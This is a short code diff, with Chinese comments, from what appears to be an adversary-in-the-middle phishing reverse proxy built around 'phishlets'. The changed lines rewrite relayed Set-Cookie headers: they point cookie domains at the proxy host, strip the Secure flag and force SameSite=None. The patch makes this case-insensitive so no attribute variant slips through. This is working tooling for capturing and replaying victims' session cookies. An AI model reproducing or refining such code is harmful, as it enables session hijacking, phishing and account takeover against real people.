@@ -181,8 +181,10 @@ def make_handler(phishlet, db_file):
                 # 防 somedomain= 误中。
                 raw = re.sub(r'(?i)(^|;\s*)([Dd]omain=)[^;]*',
                              lambda m: m.group(1) + m.group(2) + (proxy_host.rpartition(':')[0] or proxy_host), raw)
-                raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
-                raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
+                # R32D94-N2: 属性名大小写不敏感(RFC 6265; 此前 SECURE/
+                # sEcUrE/SAMESITE 原样通过)。
+                raw = re.sub(r'(?i);\s*secure', '', raw)  # 我们是 http
+                raw = re.sub(r'(?i);\s*samesite=\w+', '; SameSite=None', raw)
                 return raw
 
             _sck = [k for k in headers if k.lower() == 'set-cookie']
